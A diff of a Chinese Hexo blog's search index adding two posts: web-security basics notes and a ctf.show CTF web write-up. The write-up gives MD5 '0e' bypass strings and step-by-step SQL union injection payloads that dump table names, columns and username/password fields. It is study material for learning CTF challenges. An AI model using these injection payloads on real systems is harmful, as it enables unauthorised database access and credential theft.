-    <content><![CDATA[<h1 id="HEXO"><a href="#HEXO" class="headerlink" title="HEXO"></a>HEXO</h1><h2 id="HELLO"><a href="#HELLO" class="headerlink" title="HELLO!"></a>HELLO!</h2><blockquote>
-<p>敬请T期待</p>
+    <title>Web_白帽子</title>
+    <url>/2024/01/25/Web-%E7%99%BD%E5%B8%BD%E5%AD%90/</url>
+    <content><![CDATA[<h2 id="Web基础介绍"><a href="#Web基础介绍" class="headerlink" title="Web基础介绍"></a>Web基础介绍</h2><blockquote>
+<p>知识点罗列：</p>
+<ul>
+<li>URL概念、结构格式</li>
+<li>HTTP报文结构</li>
+<li>cookie含义</li>
+<li>Set-cookie含义</li>
+<li>Referer的作用</li>
+<li>状态码301和302的含义</li>
+<li>Location的含义</li>
+</ul>
 </blockquote>
+<h3 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h3><blockquote>
+<p>统一资源定位符（Uniform Resource Locator）</p>
+</blockquote>
+<blockquote>
+<p>作用：定位服务器资源</p>
+</blockquote>
+<blockquote>
+<p>URL格式：schemna:&#x2F;&#x2F;host[:post#]&#x2F;path&#x2F;…&#x2F;[?query-string][#anchor]</p>
+<p>schemna	底层协议(例如：http,https,ftp…)</p>
+<p>host		  服务器的域名或IP地址</p>
+<p>:post 		服务器的端口，HTTP默认端口是80(可省略)，其他端口需要指明</p>
+<p>&#x2F;path&#x2F;…&#x2F;	访问资源的路径</p>
+<p>？query-string 发送给http服务器的数据</p>
+<p>[#anchor]	 锚</p>
+</blockquote>
+<h3 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h3><blockquote>
+<p>超文本传输协议（Hyper Text Transfer Protocol）</p>
+</blockquote>
+<blockquote>
+<p>作用：Web通信时使用的协议</p>
+</blockquote>
+<blockquote>
+<ol>
+<li><p>HTTP报文</p>
+<p>HTTP报文是用于HTTP协议交互的信息，HTTP报文本身是由多行数据构成的字符串文本。客户端的HTTP报文叫做请求报文，服务器端的HTTP报文叫做响应报文。</p>
+</li>
+<li><p>HTTP报文结构</p>
+<p><img lazyload src="/images/loading.svg" data-src="https://cdn.jsdelivr.net/gh/kingwempity/photo/images/http%E6%8A%A5%E6%96%87%E7%BB%93%E6%9E%84.png" alt="http报文结构"></p>
+<p><strong>报文首部</strong>是客户端或服务器端需处理的<code>请求或响应</code>的内容及属性， 可以传递额外的重要信息。报文首部包括请求行和请求头部。</p>
+<p>空行</p>
+<p><strong>报文主体</strong>主要包含应被发送的数据。通常，不一定有报文主体。</p>
+</li>
+<li><p>HTTP请求报文结构</p>
+<p><img lazyload src="/images/loading.svg" data-src="https://cdn.jsdelivr.net/gh/kingwempity/photo/images/http%E8%AF%B7%E6%B1%82%E6%8A%A5%E6%96%87%E7%BB%93%E6%9E%84.png" alt="HTTP请求报文结构"></p>
+<p>GET和POST的区别：</p>
+<blockquote>
+<p>（1）get是从服务器上获取数据（即下载），post是向服务器传送数据（即上传）。<br>（2）生成方式不同：<br>Get：URL输入；超连接；Form表单中method属性为get；Form表单中method为空。<br>Post只有一种：Form表单中method为Post。<br>（3）数据传送方式：Get传递的请求数据按照key-value的方式放在URL后面，在网址中可以直接看到，使用?分割URL和传输数据，传输的参数之间以&amp;相连，如：login.action?name&#x3D;user&amp;password&#x3D;123。所以安全性差。<br>POST方法会把请求的参数放到请求头部和空格下面的请求数据字段就是请求正文（请求体）中以&amp;分隔各个字段，请求行不包含参数，URL中不会额外附带参数。所以安全性高。<br>（3）发送数据大小的限制：通常GET请求可以用于获取轻量级的数据，而POST请求的内容数据量比较庞大些。<br>Get：1~2KB。get方法提交数据的大小直接影响到了URL的长度，但HTTP协议规范中其实是没有对URL限制长度的，限制URL长度的是客户端或服务器的支持的不同所影响。<br>Post：没有要求。post方式HTTP协议规范中也没有限定，起限制作用的是服务器的处理程序的能力。<br>（4）提交数据的安全：POST比GET方式的安全性要高。Get安全性差，Post安全性高。<br>通过GET提交数据，用户名和密码将明文出现在URL上，如果登录页面有浏览器缓存，或者其他人查看浏览器的历史记录，那么就可以拿到用户的账号和密码了。安全性将会很差。</p>
+</blockquote>
+</li>
+<li><p>HTTP响应报文结构</p>
+<p><img lazyload src="/images/loading.svg" data-src="https://cdn.jsdelivr.net/gh/kingwempity/photo/images/http%E5%93%8D%E5%BA%94%E6%8A%A5%E6%96%87%E7%BB%93%E6%9E%84.png" alt="HTTP响应报文结构"></p>
+</li>
+</ol>
+<hr>
+<p>版权声明：本文为博主原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接和本声明。</p>
+<p>参考文章</p>
+<p>原文链接：<a class="link" href="https://blog.csdn.net/qq_35887546/article/details/104216286">https://blog.csdn.net/qq_35887546/article/details/104216286 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+</blockquote>
+<blockquote>
+<p>HTTP请求的方式</p>
+<p>–GET</p>
+<p>–POST</p>
+<p>–HEAD				 与GET请求类似，不同在于与服务器只返回HTTP头部信息，没有页面内容</p>
+<p>–PUT					上传指定URL的描述</p>
+<p>–DELETE			 删除指定资源</p>
+<p>–OPTIONS 		 返回服务器支持的HTTP方法</p>
+</blockquote>
+<h3 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h3><blockquote>
+<p>cookie:相当于用户的凭证，类似与用户的通行证，很重要。</p>
+<p>set-cookie:服务器要求浏览器设置cookie</p>
+</blockquote>
+<h3 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h3><blockquote>
+<p>Referer的作用：</p>
+<p>–告知服务器该请求的来源（浏览器自动加上）</p>
+<p>–统计流量</p>
+<p>–判断来源合法性：防止盗链，防止CSRF漏洞</p>
+</blockquote>
+<h3 id="Location"><a href="#Location" class="headerlink" title="Location"></a>Location</h3><blockquote>
+<p>Location：跳转到地址</p>
+</blockquote>
+<h3 id="响应报文状态码"><a href="#响应报文状态码" class="headerlink" title="响应报文状态码"></a>响应报文状态码</h3><blockquote>
+<p>响应报文状态码</p>
+<p><strong>3</strong>：完成此请求必须进一步处理**</p>
+<p>301——删除请求数据</p>
+<p>302——在其他地址发现了请求数据</p>
+<hr>
+<p>详细状态码：<a class="link" href="https://blog.csdn.net/qq_35887546/article/details/104216807">https://blog.csdn.net/qq_35887546/article/details/104216807 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+</blockquote>
+<h2 id="前端开发基础知识"><a href="#前端开发基础知识" class="headerlink" title="前端开发基础知识"></a>前端开发基础知识</h2><blockquote>
+<p>知识点罗列：</p>
+<p>​	–JavaScript</p>
+<p>​	–DOM</p>
+<p>​	–BOM</p>
+</blockquote>
+<h3 id="javaScript"><a href="#javaScript" class="headerlink" title="javaScript"></a>javaScript</h3><blockquote>
+<p>javaScript运行位置：</p>
+<ul>
+<li>HTML的<script></script></li>
+<li>HTML的事件属性中</li>
+<li>浏览器中的JavaScript控制台中的Console中</li>
+</ul>
+</blockquote>
+<h3 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h3><blockquote>
+<p>DOM本质：链接Web页面和编程语言</p>
+<p>JavaScript + DOM：访问和操作HTML文档的标准方法</p>
+</blockquote>
+<blockquote>
+<p>获取一个HTML元素内容</p>
+<ul>
+<li><p>tep1：获取元素</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>()<span class="comment">//获取元素</span></span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p>tep2：获取元素的内容</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">.<span class="property">innerHTML</span><span class="comment">//获取元素的内容</span></span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p>tep3：显示获取信息</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;id&quot;</span>).<span class="property">innerHTML</span>)</span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p><strong>alert()方法在JavaScript中表示弹出一个警告框，可以用来展示信息</strong></p>
+</li>
+</ul>
+</blockquote>
+<p>示例</p>
+<blockquote>
+  <div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">title</span>&gt;</span>Kinwempity<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">P</span> <span class="attr">id</span>=<span class="string">&quot;intro&quot;</span>&gt;</span></span><br><span class="line">          Hello!敬请T期待</span><br><span class="line">       <span class="tag">&lt;/<span class="name">P</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">       x=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;intro&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">       <span class="title function_">alert</span>(<span class="string">&#x27;id为intro元素的文本是：&#x27;</span>+x.<span class="property">innerHTML</span>);  </span></span><br><span class="line"><span class="language-javascript">       </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+</blockquote>
+<blockquote>
+<p>修改一个HTML元素</p>
+<ul>
+<li><p>tep1：获取元素</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>()</span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p>tep2：获取元素内容</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">.<span class="property">innerHTML</span></span><br></pre></td></tr></table></figure></div></li>
+</ul>
+</blockquote>
+<p>示例</p>
+<blockquote>
+  <div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">title</span>&gt;</span>Kinwempity<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">P</span> <span class="attr">id</span>=<span class="string">&quot;intro&quot;</span>&gt;</span></span><br><span class="line">          Hello!敬请T期待</span><br><span class="line">       <span class="tag">&lt;/<span class="name">P</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">       x=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;intro&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">       x.<span class="property">innerHTML</span>=<span class="string">&#x27;HELLO WORLD!&#x27;</span>; </span></span><br><span class="line"><span class="language-javascript">       </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+</blockquote>
+<blockquote>
+<p>将元素该为框架iframe框架</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;id&quot;</span>).<span class="property">innerHTML</span>=<span class="string">&quot;&lt;ifream src=&#x27;https://kingwempity.github.io/&#x27;&gt;&lt;/ifream&gt;&quot;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>动态创建HTML内容</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="title class_">Date</span>());<span class="comment">//向页面中写入当前时间</span></span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;ifrema src=&#x27;https://kingwempity.github.io/&#x27;&gt;&lt;/ifrema&gt;&quot;</span>)<span class="comment">//向页面中写入框架</span></span><br></pre></td></tr></table></figure></div>
+</blockquote>
+<p>示例</p>
+<blockquote>
+<div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">title</span>&gt;</span>kinwempity<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">P</span> <span class="attr">id</span>=<span class="string">&quot;intro&quot;</span>&gt;</span></span><br><span class="line">         Hello!敬请T期待</span><br><span class="line">     <span class="tag">&lt;/<span class="name">P</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">     	<span class="keyword">function</span> <span class="title function_">changetext</span>(<span class="params">id</span>)</span></span><br><span class="line"><span class="language-javascript">         &#123;</span></span><br><span class="line"><span class="language-javascript">             id.<span class="property">innerHTML</span>=<span class="string">&quot;Kingwempity@敬请T期待&quot;</span>;<span class="comment">//点击后变化的内容</span></span></span><br><span class="line"><span class="language-javascript">         &#125;</span></span><br><span class="line"><span class="language-javascript">     </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">h1</span> <span class="attr">onclick</span>=<span class="string">&quot;changetext(this)&quot;</span>&gt;</span></span><br><span class="line">         点我会发生变化o_o哦！</span><br><span class="line">     <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+</blockquote>
+<h3 id="BOM"><a href="#BOM" class="headerlink" title="BOM"></a>BOM</h3><blockquote>
+<p>BOM:浏览器对象模型(Browser Object Model)</p>
+</blockquote>
+<blockquote>
+<p>让浏览器来警告用户:</p>
+<p>警告弹窗alert()</p>
+<p>确认弹窗confirm()</p>
+<p>提示弹窗prompt()</p>
+<p>以上弹窗常用于简单的调试和信息展示。例如XSS漏洞测试</p>
+</blockquote>
+<blockquote>
+<p>获取用户cookie（通常为浏览器发给用户客户端的一小段文本信息）</p>
+<blockquote>
+<p>常见场景：</p>
+<p>用户输入用户名和密码成功登录网站后，网站会生成一个cookie给用户，当作用户凭证</p>
+</blockquote>
+<p>cookie一般在控制台的network或Application中可以查看</p>
+<ul>
+<li><p>获取Cookie</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">cookie</span><span class="comment">//获取cookie</span></span><br></pre></td></tr></table></figure></div>
+
+
+</li>
+<li><p>修改写入Cookie</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">doucment.<span class="property">cookie</span>=<span class="string">&quot;写入值&quot;</span>#值的形式key=value</span><br></pre></td></tr></table></figure></div>
+
+
+</li>
+<li><p>显示cookie</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">alert(document.cookie)</span><br></pre></td></tr></table></figure></div></li>
+</ul>
+</blockquote>
+<blockquote>
+<p>获取浏览器屏幕信息</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="variable language_">window</span>.)screen</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>获取&#x2F;控制用户页面的URL</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span><span class="comment">//获取当前页面url</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">location</span><span class="comment">//获取当前页面url</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;https://kingwempity.github.io/&quot;</span><span class="comment">//控制当前页面url</span></span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>获取访问者浏览器信息</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="variable language_">window</span>.)navigator</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>操作浏览器窗口</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&quot;https://kingwempity.github.io/&quot;</span>)<span class="comment">//打开页面</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">close</span>(<span class="string">&quot;https://kingwempity.github.io/&quot;</span>)<span class="comment">//关闭页面</span></span><br></pre></td></tr></table></figure></div>
+
+
+
+</blockquote>
+<p>敬请T期待！</p>
 ]]></content>
       <categories>
-        <category>Life</category>
+        <category>CTF</category>
       </categories>
       <tags>
-        <tag>Begin</tag>
+        <tag>笔记</tag>
+        <tag>Web</tag>
+        <tag>安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ctf.show_web</title>
+    <url>/2024/02/20/ctf-show-web/</url>
+    <content><![CDATA[<meta name="referrer" content="no-referrer">
+
+<h2 id="CTF-show秀"><a href="#CTF-show秀" class="headerlink" title="CTF.show秀"></a>CTF.show秀</h2><h3 id="Web4"><a href="#Web4" class="headerlink" title="Web4"></a>Web4</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctf.show_web4_1.png" alt="ctf.show_web4_1"></p>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctf.show_web4_2.png" alt="ctf.show_web4_2"></p>
+<blockquote>
+<p>一个文件包含漏洞题目,<strong>日志注入</strong></p>
+</blockquote>
+<blockquote>
+<p><u>使用include()函数接收url参数,include()函数包含的文件会被执行,从而造成任意代码执行,或者配合伪协议获取敏感文件甚至getshell;</u></p>
+<p>本题伪协议不起作用,我们可以通过日志注入进行任意命令执行,从而getshell</p>
+</blockquote>
+<h3 id="Web5"><a href="#Web5" class="headerlink" title="Web5"></a>Web5</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctf.show_web5_1.png" alt="ctf.show_web5_1"></p>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctf.show_web5_2.png" alt="ctf.show_web5_2"></p>
+<blockquote>
+<p>传递两个参数,一个字符串,一个数字,并且两个参数的md5值必须相同,我们可以利用<strong>md5的0e漏洞进行绕过</strong></p>
+<p>通过GET请求传递两个参数v1和v2,并且参数v1必须是纯字母字符串,参数v2必须是数字或者数字字符串,并且两个参数的md5值必须相等</p>
+</blockquote>
+<blockquote>
+<p>0e绕过是指:0e开头的字符串在参与弱类型比较时,会被当做科学计数法,结果转换为0;</p>
+</blockquote>
+<blockquote>
+<ul>
+<li><strong>ctype_alpha()函数用于检测字符串中是否仅包含字母,是则返回true,否则返回false</strong></li>
+<li><strong>is_numeric()函数用于检测变量是否为数字或数字字符串,是则返回true,否则返回false</strong></li>
+</ul>
+</blockquote>
+<blockquote>
+<p>两个md5值进行弱类型比较</p>
+<blockquote>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">md5(&#x27;QNKCDZO&#x27;) == md5(240610708)</span><br></pre></td></tr></table></figure></div>
+</blockquote>
+<p>MD5加密后会变成这个样子</p>
+<blockquote>
+<p>0e830400451993494058024219903391 &#x3D;&#x3D; 0e462097431906509019562988736854</p>
+</blockquote>
+<p>由于0e开头的字符串会转换为0,所以真正比较的过程会变成下面这样</p>
+<blockquote>
+<p>0&#x3D;&#x3D;0</p>
+</blockquote>
+<p>返回结果为true,也就是说0e开头的md5值进行弱类型比较时,结果相等</p>
+</blockquote>
+<p><em><strong><u>常用的MD5加密后以0E开头的有</u></strong></em></p>
+<blockquote>
+<p>​    QNKCDZO<br>​    240610708<br>​    byGcY<br>​    sonZ7y<br>​    aabg7XSs<br>​    aabC9RqS<br>​    s878926199a<br>​    s155964671a<br>​    s214587387a<br>​    s1091221200a</p>
+</blockquote>
+<h3 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h3><blockquote>
+<p>SQL联合注入</p>
+</blockquote>
+<blockquote>
+<p>打开题目看见文章列表，随机点击，点第一个</p>
+</blockquote>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web7_1.png" alt="ctfshow_web7_1"></p>
+<blockquote>
+<p>发现显示文章，本想搜索flag,发现没有，看见url中id&#x3D;1</p>
+<p><strong><u>从url地址栏中可以看到,页面通过文章的id值来查询文章内容,我们可以考虑SQL注入漏洞</u></strong></p>
+<p>首先判断注入点,输入以下payload,使SQL恒成立,发现显示文章成功</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1/**/and/**/1</span><br></pre></td></tr></table></figure></div>
+
+<p>在输入以下payload,使SQL恒不成立,发现显示不出文章，</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1/**/and/**/0</span><br></pre></td></tr></table></figure></div>
+
+<p>由此可以判断页面存在SQL注入,注入点为<u><strong>数值型注入</strong></u>,页面中有显示位,可以尝试<u><strong>联合注入</strong></u>进行脱库</p>
+</blockquote>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web7_2.png" alt="ctfshow_web7_2"></p>
+<blockquote>
+<p>先来判断显示位,此处id传一个**-1**,<strong>由于id通常不为负数,后端根据id查询不到内容</strong>,就只能展示联合查询的结果,从而帮助我们判断字段显示的位置</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/1,2,3#</span><br></pre></td></tr></table></figure></div>
+</blockquote>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web7_3.png" alt="ctfshow_web7_3"></p>
+<blockquote>
+<p>判断数据库</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/1,database(),3#</span><br></pre></td></tr></table></figure></div>
+</blockquote>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web7_4.png" alt="ctfshow_web7_4"></p>
+<blockquote>
+<p>查看web数据库中的flag表</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=&quot;web7&quot;),3#</span><br></pre></td></tr></table></figure></div>
+</blockquote>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web7_5.png" alt="ctfshow_web7_5"></p>
+<blockquote>
+<p>查看flag表中的flag字段</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/1,(select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=&quot;flag&quot;),3#</span><br></pre></td></tr></table></figure></div>
+
+<p>也可使用</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/1,(select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema=&quot;web7&quot;/**/and/**/table_name=&quot;flag&quot;),3</span><br></pre></td></tr></table></figure></div>
+
+
+</blockquote>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web7_6.png" alt="ctfshow_web7_6"></p>
+<blockquote>
+<p>查看目标FLAG</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/1,(select/**/flag/**/from/**/flag),3#</span><br></pre></td></tr></table></figure></div>
+</blockquote>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web7_7.png" alt="ctfshow_web7_7"></p>
+<h3 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h3><blockquote>
+<p>SQL联合注入，GET请求方式</p>
+</blockquote>
+<img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web14_1.png" alt="ctfshow_web14_1" style="zoom:80%;">
+
+<blockquote>
+<p>尝试输入c获取$url,发现输入555555、3333、6000000时间过于漫长，输入1、2、3发现输入3时输出并非@A@,而是@<a class="link" href="mailto:&#65;&#64;&#104;&#101;&#114;&#x65;&#95;&#49;&#x73;&#95;&#121;&#x6f;&#117;&#114;&#x5f;&#x66;&#x31;&#97;&#x67;&#46;&#x70;&#x68;&#x70;">&#65;&#64;&#104;&#101;&#114;&#x65;&#95;&#49;&#x73;&#95;&#121;&#x6f;&#117;&#114;&#x5f;&#x66;&#x31;&#97;&#x67;&#46;&#x70;&#x68;&#x70; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>@A@，或许here_1s_your_f1ag.php里面就包含flag，查看here_1s_your_f1ag.php文件，发现查询页面，查看是否能进行SQL注入</p>
+</blockquote>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web14_2.png" alt="ctfshow_web14_2"></p>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web14_3.png" alt="ctfshow_web14_3"></p>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web14_4.png" alt="ctfshow_web14_4"></p>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web14_5.png" alt="ctfshow_web14_5"></p>
+<blockquote>
+<p>通过以上判断该题为SQL注入，注入点为数值型注入, 页面有回显, 推荐使用联合注入</p>
+</blockquote>
+<blockquote>
+<p><u><strong>获取当前使用的数据库(爆库）</strong></u></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/database()</span><br></pre></td></tr></table></figure></div>
+</blockquote>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web14_6.png" alt="ctfshow_web14_6"></p>
+<blockquote>
+<p><u><strong>获取数据库中的表(爆表)</strong></u></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/group_concat(table_name)/**/from/**/information_schema.`tables`/**/where/**/table_schema=database()</span><br></pre></td></tr></table></figure></div>
+</blockquote>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web14_7.png" alt="ctfshow_web14_7"></p>
+<blockquote>
+<p><u><strong>获取表中的字段(爆字段)</strong></u></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/group_concat(column_name)/**/from/**/information_schema.`columns`/**/where/**/table_name=&#x27;content&#x27;</span><br></pre></td></tr></table></figure></div>
+</blockquote>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web14_8.png" alt="ctfshow_web14_8"></p>
+<blockquote>
+<p><u><strong>查询字段内容(查字段)</strong></u></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/group_concat(username,password)/**/from/**/content</span><br></pre></td></tr></table></figure></div>
+</blockquote>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web14_9.png" alt="ctfshow_web14_9"></p>
+<blockquote>
